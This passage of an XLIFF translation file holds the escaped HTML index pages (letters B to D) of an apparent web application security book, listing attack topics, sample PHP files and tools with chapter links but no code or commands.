          <source>&lt;a class="v2" href="ch08lev1sec2.html#iddle1055"&gt; base64&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec10.html#iddle1056"&gt; BHODemon&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec9.html#iddle1057"&gt; BHOs (browser helper objects)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1058"&gt; black-listing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec4.html#iddle1059"&gt; BlackWidow&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch08lev1sec2.html#iddle1060"&gt; breaking authentication&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1061"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1062"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1063"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec9.html#iddle1064"&gt; browser helper objects (BHOs)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1065"&gt; Brutus&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1066"&gt; buffer overflow&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1067"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1068"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1069"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1070"&gt; saveuser.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1071"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;bugs&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1072"&gt; 1970s&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1073"&gt; account.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1074"&gt; checksession.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1075"&gt; delivery.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1076"&gt; guestbook.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1077"&gt; lifecycle of&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1078"&gt; login.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1079"&gt; saveuser.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1080"&gt; search.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1081"&gt; selectarrangements.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1082"&gt; selectflowers.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1083"&gt; sendmessage.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1084"&gt; sendmessage.php (tellfriend.php)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1085"&gt; showdetails.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1086"&gt; BugTraq&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch03lev1sec2.html#iddle1087"&gt; bypass client-side validation attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1088"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1089"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1090"&gt; protecting against this attack&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch03lev1sec2.html#iddle1091"&gt; bypass restrictions on input choices&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1092"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1093"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1094"&gt; protecting against this attack&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=A.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=C.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=B.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html" style="font-weight:bold;"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch06lev1sec2.html#iddle1095"&gt; C, NULL characters&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec8.html#iddle1096"&gt; caching pages&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1097"&gt; Caesar cipher&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1098"&gt; canonicalization&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1099"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1100"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1101"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1102"&gt; Capability Maturity Model (CMM)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1103"&gt; CAPTCHA&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1104"&gt; Cardholder Information Security Program (CISP 0)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec3.html#iddle1105"&gt; CASE&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1106"&gt; CBSE (component-based software engineering)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1107"&gt; cClient-side scripts&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1108"&gt; CGI (Common Gateway Interface)&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch04lev1sec2.html#iddle1109"&gt; CGI parameters&lt;/a&gt;&lt;a class="v2" href="ch04lev1sec2.html#iddle1110"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1111"&gt; performing this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1112"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;characters&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1113"&gt; / (HTTP)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1114"&gt; ASCII characters&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1115"&gt; characters commonly used in attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1116"&gt; directing output to other files or programs&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1117"&gt; double URL encoding&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1118"&gt; encoding&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1119"&gt; checksession.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1120"&gt; cipher suite&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1121"&gt; CISP (Cardholder Information Security Program)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec4.html#iddle1122"&gt; Cleanroom&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec4.html#iddle1123"&gt; click-through&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch01lev1sec2.html#iddle1124"&gt; client-server networks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1125"&gt; versus Web&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1126"&gt; client-side scripting&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1127"&gt; client-side validation, removing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1128"&gt; clients&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1129"&gt; fat clients&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1130"&gt; thin clients&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec5.html#iddle1131"&gt; Clipboard data, privacy concerns&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1132"&gt; clustering&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1133"&gt; CMM (Capability Maturity Model)&lt;/a&gt;&lt;a class="v2" href="app01lev1sec6.html#iddle1134"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1135"&gt; code reuse&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1136"&gt; CodeRed worm&lt;/a&gt;&lt;br /&gt;ColdFusion&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1137"&gt; comments&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1138"&gt; validation&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch07lev1sec2.html#iddle1139"&gt; command injection&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1140"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1141"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1142"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1143"&gt; sendmessage.php (tellfriend.php)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1144"&gt; comments&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1145"&gt; application comments&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1146"&gt; ColdFusion&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch02lev1sec2.html#iddle1147"&gt; HTML&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1148"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1149"&gt; SQL injection&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1150"&gt; commercial off-the-shelf (COTS) components&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1151"&gt; Common Gateway Interface (CGI)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec1.html#iddle1152"&gt; communication&lt;/a&gt;&lt;br /&gt;compilation&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec2.html#iddle1153"&gt; 1960s&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec3.html#iddle1154"&gt; 1970s&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1155"&gt; component-based software engineering (CBSE)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1156"&gt; components&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1157"&gt; confidentiality&lt;/a&gt;&lt;br /&gt;control pages&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1158"&gt; hiding&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1159"&gt; ports&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch04lev1sec2.html#iddle1160"&gt; cookie poisoning&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1161"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1162"&gt; performing this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1163"&gt; protecting this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1164"&gt; cookies&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1165"&gt; HTTP (Microsoft)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec4.html#iddle1166"&gt; privacy and&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1167"&gt; temporary cookies&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1168"&gt; cost of faulty software&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec5.html#iddle1169"&gt; COTS (commercial off-the-shelf) components&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1170"&gt; credentials&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1171"&gt; cross-site scripting (XSS)&lt;/a&gt;&lt;a class="v2" href="ch06lev1sec2.html#iddle1172"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1173"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch05lev1sec2.html#iddle1174"&gt; conducting this attack&lt;/a&gt;&lt;a class="v2" href="ch05lev1sec2.html#iddle1175"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1176"&gt; guestbook.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1177"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1178"&gt; reflected XSS&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1179"&gt; stored XSS&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch08lev1sec2.html#iddle1180"&gt; cross-site tracing&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1181"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1182"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1183"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1184"&gt; cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fake cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1244"&gt;fake cryptography&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;forcing weak cryptography
 [See  &lt;a class="docLink" href="index&amp;amp;view=F.html#iddle1263"&gt;forcing weak cryptography&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="app03lev1sec6.html#iddle1187"&gt; cURL&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec10.html#iddle1188"&gt; Curphey, Mark&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1189"&gt; Cygwin&lt;/a&gt;&lt;a class="v2" href="app03lev1sec1.html#iddle1190"&gt; 2nd&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=B.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=D.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=C.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
